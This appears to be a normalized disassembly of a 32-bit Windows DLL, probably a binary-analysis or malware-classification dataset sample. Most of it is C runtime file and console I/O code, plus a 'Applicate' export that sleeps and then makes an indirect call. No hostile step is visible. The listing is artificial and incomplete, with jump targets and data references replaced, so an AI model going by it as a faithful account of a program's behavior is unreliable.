add esp 0xc
mov edi eax
jmp r-xdata
call sub_10004795
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10008224
mov eax edi
jmp r-xdata
sub_1000824d
push ebp
mov ebp esp
mov eax 0x1af0
call sub_10008b60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
xor edx edx
push edi
mov edi edx
mov [ ebp - 0x1ac0 ] eax
mov [ ebp - 0x1abc ] ecx
mov [ ebp - 0x1ac4 ] edi
mov [ ebp - 0x1ad4 ] edx
cmp [ ebp + 0x10 ] edx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push esi
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
shl esi 0x6
mov [ ebp - 0x1ad0 ] ecx
mov ecx [ ecx * 4 + rw-data ]
mov [ ebp - 0x1aec ] esi
mov bl [ esi + ecx + 0x24 ]
add bl bl
sar bl 0x1
cmp bl 0x2
je r-xdata
call sub_100057b5
and [ eax ] edi
call sub_100057e9
mov [ eax ] 0x16
call sub_10005b17
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_10002de0
leave
retn
mov eax [ ebp + 0x10 ]
not eax
test al 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
mov eax [ ebp - 0x1ac0 ]
call sub_100057b5
and [ eax ] edi
call sub_100057e9
mov [ eax ] 0x16
call sub_10005b17
jmp r-xdata
test [ esi + ecx + 0x4 ] 0x20
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_10007998
pop ecx
test eax eax
je r-xdata
push 0x2
push edx
push edx
push eax
call sub_10008d71
add esp 0x10
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
test [ esi + eax + 0x4 ] 0x80
je r-xdata
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
test [ esi + eax + 0x4 ] 0x80
je r-xdata
pop esi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1abc ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
xor esi esi
mov [ ebp - 0x1ac8 ] esi
test bl bl
jne r-xdata
call sub_10003390
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0xa8 ] ecx
lea eax [ ebp - 0x1ae4 ]
push eax
mov eax [ ebp - 0x1ad0 ]
sete cl
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
mov [ ebp - 0x1ac0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov edi [ ebp - 0x1ad8 ]
xor esi esi
jmp r-xdata
mov ecx edx
cmp bl 0x2
jne r-xdata
mov eax edx
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] esi
jbe r-xdata
cmp [ ebp - 0x1ac0 ] edi
je r-xdata
sub edi [ ebp - 0x1ad4 ]
mov eax edi
test esi esi
je r-xdata
mov edx [ ebp - 0x1abc ]
mov ebx [ ebp + 0x10 ]
mov [ ebp - 0x1adc ] ecx
test ebx ebx
je r-xdata
mov [ ebp - 0x1ac0 ] ecx
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax [ ebp - 0x1ad0 ]
mov ecx [ ebp - 0x1aec ]
mov eax [ eax * 4 + rw-data ]
test [ ecx + eax + 0x4 ] 0x40
je r-xdata
xor ecx ecx
sub eax edx
mov edx [ ebp - 0x1ac4 ]
lea ebx [ ebp - 0x1ab8 ]
mov [ ebp - 0x1ac0 ] ecx
call [ GetConsoleCP@IAT ]
mov edx [ ebp - 0x1abc ]
and [ ebp - 0x1adc ] edi
mov ecx edx
mov [ ebp - 0x1af0 ] eax
mov [ ebp - 0x1acc ] ecx
cmp [ ebp + 0x10 ] edi
jbe r-xdata
test bl bl
je r-xdata
push 0x5
pop ebx
cmp esi ebx
jne r-xdata
mov [ ebp - 0x1ae8 ] 0xa
mov [ ebp - 0x1ae8 ] 0xa
call sub_100057e9
mov [ eax ] 0x1c
call sub_100057b5
and [ eax ] 0x0
cmp [ edx ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1aec ]
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov cl [ edx ]
inc edx
inc eax
mov [ ebp - 0x1add ] cl
cmp cl 0xa
mov ecx [ ebp - 0x1ac0 ]
mov [ ebp - 0x1ac4 ] edx
jne r-xdata
mov esi [ ebp - 0x1ac0 ]
jmp r-xdata
xor eax eax
mov [ ebp - 0x1ac8 ] eax
mov [ ebp - 0x1ae8 ] 0xa
push esi
call sub_100057c8
pop ecx
jmp r-xdata
call sub_100057e9
mov [ eax ] 0x9
call sub_100057b5
mov [ eax ] ebx
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov esi [ ebp - 0x1ac8 ]
mov edi [ ebp - 0x1ac4 ]
mov [ ebp - 0x1acc ] eax
test eax eax
je r-xdata
movzx edi [ esi ]
add esi 0x2
add ecx 0x2
mov [ ebp - 0x1adc ] esi
cmp di [ ebp - 0x1ae8 ]
jne r-xdata
mov ecx [ ebp - 0x1aec ]
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov [ ebp - 0x1ad4 ] edi
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
mov esi [ ebp - 0x1ac8 ]
mov edi [ ebp - 0x1ac4 ]
test eax eax
je r-xdata
movzx esi [ ecx ]
add ecx 0x2
add eax 0x2
mov [ ebp - 0x1ac0 ] ecx
cmp si [ ebp - 0x1ae8 ]
jne r-xdata
xor eax eax
jmp r-xdata
add edi [ ebp - 0x1ad8 ]
mov edx [ ebp - 0x1abc ]
cmp [ ebp - 0x1ad8 ] ebx
jl r-xdata
mov dl [ ebp - 0x1add ]
mov [ ebx ] dl
mov edx [ ebp - 0x1ac4 ]
inc ebx
inc ecx
mov [ ebp - 0x1ac0 ] ecx
cmp ecx 0x13ff
jb r-xdata
inc [ ebp - 0x1ad4 ]
mov [ ebx ] 0xd
inc ebx
inc ecx
cmp bl 0x1
je r-xdata
mov cl [ ecx ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad0 ]
mov edx [ eax * 4 + rw-data ]
cmp [ esi + edx + 0x38 ] 0x0
je r-xdata
xor ecx ecx
mov [ ebp - 0x1ac0 ] ecx
mov [ eax ] di
add edx 0x2
add eax 0x2
cmp edx 0x6a8
jb r-xdata
push 0xd
pop esi
mov [ eax ] si
mov esi [ ebp - 0x1adc ]
add eax 0x2
add edx 0x2
add edi [ ebp - 0x1ad8 ]
mov edx [ ebp - 0x1abc ]
mov [ ebp - 0x1ac4 ] edi
cmp [ ebp - 0x1ad8 ] ebx
jl r-xdata
mov [ ebx ] si
add edx 0x2
add ebx 0x2
cmp edx 0x13fe
jb r-xdata
push 0xd
pop ecx
mov [ ebx ] cx
mov ecx [ ebp - 0x1ac0 ]
add edi 0x2
add ebx 0x2
add edx 0x2
test edi edi
jne r-xdata
mov eax [ ebp - 0x1ac4 ]
sub eax edx
cmp eax [ ebp + 0x10 ]
mov eax [ ebp - 0x1ac4 ]
jb r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
movzx eax [ ecx ]
xor edx edx
cmp ax [ ebp - 0x1ae8 ]
mov [ ebp - 0x1ac4 ] eax
mov eax [ ebp - 0x1ac8 ]
sete dl
add ecx 0x2
add eax 0x2
mov [ ebp - 0x1acc ] ecx
mov [ ebp - 0x1ac8 ] eax
mov [ ebp - 0x1ac0 ] edx
cmp bl 0x2
jne r-xdata
movsx eax cl
push eax
call sub_10008d60
pop ecx
test eax eax
je r-xdata
mov al [ esi + edx + 0x34 ]
mov [ ebp - 0xc ] al
push 0x2
lea eax [ ebp - 0xc ]
mov [ ebp - 0xb ] cl
and [ esi + edx + 0x38 ] 0x0
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp - 0x1ac0 ]
mov esi eax
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] esi
mov ecx [ ebp - 0x1ac0 ]
add ecx [ ebp - 0x1ad8 ]
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
cmp eax ecx
jg r-xdata
cmp ecx ebx
jae r-xdata
mov ecx [ ebp - 0x1ac0 ]
mov eax ecx
sub eax edx
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp eax [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1ac4 ]
call sub_10008eed
pop ecx
cmp ax [ ebp - 0x1ac4 ]
jne r-xdata
cmp bl 0x2
jne r-xdata
cmp bl 0x1
je r-xdata
push 0x1
push [ ebp - 0x1acc ]
mov eax [ ebp - 0x1abc ]
mov edx [ ebp - 0x1acc ]
sub eax edx
add eax [ ebp + 0x10 ]
cmp eax 0x1
jbe r-xdata
lea eax [ ebp - 0x1ac4 ]
push eax
call sub_10008ed5
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x1adc ]
mov edx [ ebp - 0x1abc ]
mov edi ecx
sub edi edx
mov [ ebp - 0x1ac4 ] edi
cmp edi ebx
jb r-xdata
push 0x0
sub eax ecx
lea edx [ ebp - 0x1ad8 ]
push edx
push eax
lea eax [ ebp - 0x1410 ]
add eax ecx
mov ecx [ ebp - 0x1aec ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ ecx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
jmp r-xdata
and [ ebp - 0x1ae4 ] 0x0
mov edi [ ebp - 0x1ad4 ]
mov eax ecx
sub eax edx
mov edx [ ebp - 0x1ae4 ]
lea ebx [ ebp - 0x1ab8 ]
jmp r-xdata
add edi 0x2
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov esi [ ebp - 0x1ac0 ]
jmp r-xdata
mov eax [ ebp - 0x1acc ]
mov ebx [ ebp - 0x1ad0 ]
mov al [ edx ]
mov ecx [ ebx * 4 + rw-data ]
inc edi
mov [ esi + ecx + 0x34 ] al
mov eax [ ebx * 4 + rw-data ]
mov [ esi + eax + 0x38 ] 0x1
push 0x2
push edx
lea eax [ ebp - 0x1ac4 ]
push eax
call sub_10008ed5
add esp 0xc
cmp eax 0xffffffff
je r-xdata
and [ ebp - 0x1ae4 ] 0x0
mov esi [ ebp - 0x1adc ]
sub ecx edx
mov edx [ ebp - 0x1ae4 ]
lea eax [ ebp - 0x6b8 ]
jmp r-xdata
cmp eax ecx
jg r-xdata
mov eax [ ebp - 0x1ac8 ]
mov ecx [ ebp - 0x1acc ]
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac4 ] eax
call sub_10008eed
pop ecx
cmp ax [ ebp - 0x1ac4 ]
jne r-xdata
test bl bl
jne r-xdata
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x1adc ]
push ecx
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
inc eax
inc [ ebp - 0x1ac8 ]
jmp r-xdata
inc edi
inc [ ebp - 0x1ad4 ]
mov edi [ ebp - 0x1ac8 ]
mov eax [ ebp - 0x1ae4 ]
add edi [ ebp - 0x1ad4 ]
cmp [ ebp - 0x1adc ] eax
jl r-xdata
xor ecx ecx
push ecx
push ecx
inc eax
inc [ ebp - 0x1ac8 ]
push 0x5
mov [ ebp - 0x1acc ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp - 0x1ac4 ]
push eax
push ecx
push [ ebp - 0x1af0 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x1ae4 ] eax
test eax eax
je r-xdata
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1adc ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad0 ]
mov [ ebp - 0xc ] 0xd
mov eax [ eax * 4 + rw-data ]
push [ esi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1adc ] 0x1
jl r-xdata
inc [ ebp - 0x1ad4 ]
inc edi
jmp r-xdata
sub_10008a77
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_100057e9
mov [ eax ] 0x16
call sub_10005b17
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_10007a32
push esi
mov edi eax
call sub_10009092
push esi
call sub_10007974
push eax
call sub_10008f2e
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
cmp [ esi + 0x1c ] 0x0
je r-xdata
or edi 0xffffffff
jmp r-xdata
push [ esi + 0x1c ]
call sub_10003622
and [ esi + 0x1c ] 0x0
pop ecx
sub_10008ae3
push 0xc
push r--data
call sub_10004750
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_100057e9
mov [ eax ] 0x16
call sub_10005b17
push esi
call sub_1000626c
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_10008a77
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10008b52
jmp r-xdata
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
call sub_10004795
retn
sub_10008b60
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_10008b8b
push 0x8
push r--data
call sub_10004750
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
add eax 0xc
add eax edi
push eax
call [ EnterCriticalSection@IAT ]
xor eax eax
inc eax
call sub_10004795
retn
push 0xa
call sub_1000494d
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10008c0e
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
sub_10008c17
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_100057e9
mov [ eax ] 0x9
call sub_100057b5
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov edi eax
sar edi 0x5
mov esi eax
mov ecx [ edi * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ esi + ecx + 0x4 ] 0x1
je r-xdata
cmp [ esi + ecx ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi * 4 + rw-data ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
xor ecx ecx
sub eax ecx
je r-xdata
pop edi
pop esi
pop ebp
retn
push ecx
push 0xfffffff6
dec eax
je r-xdata
push ecx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ecx
push 0xfffffff4
jmp r-xdata
sub_10008c9d
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_100057b5
and [ eax ] 0x0
call sub_100057e9
mov [ eax ] 0x9
jmp r-xdata
call sub_100057b5
and [ eax ] 0x0
call sub_100057e9
mov [ eax ] 0x9
call sub_10005b17
cmp ecx [ rw-data ]
jae r-xdata
or eax 0xffffffff
pop ebp
retn
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_10008d04
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax ecx
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
add ecx 0xc
add eax ecx
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_10008d2a
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10004e30
mov eax [ ebp - 0x10 ]
movzx ecx [ ebp + 0x8 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10008d71
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_10008c9d
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ SetFilePointerEx@IAT ]
test eax eax
jne r-xdata
call sub_100057e9
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
and esi 0x1f
mov eax [ eax * 4 + rw-data ]
shl esi 0x6
and [ eax + esi + 0x4 ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
push eax
call sub_100057c8
pop ecx
jmp r-xdata
pop edi
pop esi
leave
retn
mov eax edi
mov edx edi
jmp r-xdata
sub_10008de2
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
xor eax eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10004e30
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_10008d2a
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
xor edi edi
inc edi
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push edi
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov edi [ ebp - 0x10 ]
cmp [ edi + 0x74 ] 0x1
jle r-xdata
xor edi edi
inc edi
jmp r-xdata
movzx eax [ esi ]
mov [ ecx ] ax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_100057e9
or edi 0xffffffff
mov [ eax ] 0x2a
cmp ebx [ edi + 0x74 ]
cmp ebx [ edi + 0x74 ]
jl r-xdata
mov eax edi
pop edi
jmp r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ esi + 0x1 ] 0x0
je r-xdata
jb r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push [ edi + 0x74 ]
push esi
push 0x9
push [ edi + 0x4 ]
call [ MultiByteToWideChar@IAT ]
mov edi [ ebp - 0x10 ]
test eax eax
jne r-xdata
pop esi
pop ebx
leave
retn
mov edi [ edi + 0x74 ]
jmp r-xdata
sub_10008eed
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
call sub_1000911b
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_10008f2e
push 0x10
push r--data
call sub_10004750
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_100057b5
and [ eax ] 0x0
call sub_100057e9
mov [ eax ] 0x9
jmp r-xdata
call sub_100057b5
and [ eax ] 0x0
call sub_100057e9
mov [ eax ] 0x9
call sub_10005b17
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
push esi
call sub_10008b8b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_100057e9
mov [ eax ] 0x9
or edi 0xffffffff
push esi
call sub_10008ff8
pop ecx
mov edi eax
jmp r-xdata
call sub_10004795
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10008fcf
mov eax edi
jmp r-xdata
sub_10008ff8
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_10008c9d
pop ecx
cmp eax 0xffffffff
je r-xdata
xor esi esi
mov eax [ rw-data ]
cmp edi 0x1
jne r-xdata
xor eax eax
push esi
call sub_100057c8
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp edi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push edi
call sub_10008c9d
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_10008c9d
push 0x1
mov esi eax
call sub_10008c9d
pop ecx
pop ecx
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push edi
call sub_10008c17
pop ecx
mov ecx edi
sar ecx 0x5
and edi 0x1f
mov ecx [ ecx * 4 + rw-data ]
shl edi 0x6
mov [ ecx + edi + 0x4 ] 0x0
test esi esi
je r-xdata
sub_10009092
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test [ esi + 0xc ] 0x83
je r-xdata
pop esi
pop ebp
retn
test [ esi + 0xc ] 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_10003622
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_100090d0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_10009150
push sub_100047b0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_100013f1
mov ecx esi
call sub_10002cf4
retn
Applicate
push 0x2710
call [ Sleep@IAT ]
call sub_10002ac8
push 0xffffffff
push [ rw-data ]
call [ rw-data ]
xor eax eax
retn
sub_10002cf4
test ecx ecx
je r-xdata
retn
push ecx
push 0x0
push [ rw-data ]
call [ rw-data ]
sub_10002f07
test esi esi
jne r-xdata
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_10003540
_start
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10002fba
add esp 0xc
pop ebp
retn 0xc
call sub_100041dd
sub_1000309c
mov ecx [ ebp - 0x14 ]
mov eax [ ecx ]
push ecx
push [ eax ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100030c8
add esp 0x14
retn
sub_10003345
push 0xd
call sub_10004ab1
pop ecx
retn
sub_10003351
push 0xc
call sub_10004ab1
pop ecx
retn
sub_100034b8
push 0xd
call sub_10004ab1
pop ecx
retn
sub_100034c1
push 0xc
call sub_10004ab1
pop ecx
retn
sub_10003540
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
jmp sub_10004981
push eax
call sub_10004320
or [ rw-data ] 0xffffffff
pop ecx
sub_10003615
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10003805
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_100037d3
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_1000392b
push ebp
mov ebp esp
call sub_1000559d
push [ ebp + 0x8 ]
call sub_100055fa
pop ecx
push 0xff
call sub_100039e7
int3
sub_10003947
push 0x1
push 0x0
push 0x0
call sub_10003a83
add esp 0xc
retn
sub_100039e7
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_10003a83
add esp 0xc
pop ebp
retn
sub_10003a71
push 0x8
call sub_1000494d
pop ecx
retn
sub_10003a7a
push 0x8
call sub_10004ab1
pop ecx
retn
sub_10003b9d
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_10004ab1
pop ecx
sub_10003bb2
call [ GetProcessHeap@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_10003bc7
and [ rw-data ] 0x0
retn
sub_10003e74
push 0xb
call sub_10004ab1
pop ecx
retn
sub_10004302
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
pop ebp
jmp [ TlsAlloc@IAT ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10004320
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsFree@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_1000433f
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsGetValue@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_100045fd
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop ebp
retn
sub_10004612
push ebp
mov ebp esp
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push [ ebp + 0x8 ]
call [ UnhandledExceptionFilter@IAT ]
pop ebp
retn
sub_10004795
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_10004a73
push 0xa
call sub_10004ab1
pop ecx
retn
sub_10004ab1
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_10004dbe
push 0xc
call sub_10004ab1
pop ecx
retn
sub_10004e12
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_100051fa
pop ecx
mov [ rw-data ] 0x1
sub_100051f1
push 0xd
call sub_10004ab1
pop ecx
retn
sub_10005372
push 0xd
call sub_10004ab1
pop ecx
retn
sub_10005adf
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10005c39
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
xor ecx ecx
cmp [ eax ] 0xc0000005
sete cl
mov eax ecx
retn
sub_10005d0a
call sub_10003a7a
